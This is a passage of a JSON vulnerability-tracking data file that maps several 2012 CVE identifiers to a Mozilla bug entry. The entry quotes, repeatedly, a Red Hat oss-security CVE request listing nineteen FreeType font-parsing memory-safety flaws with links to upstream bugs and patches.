(FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1140": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1141": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1142": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of 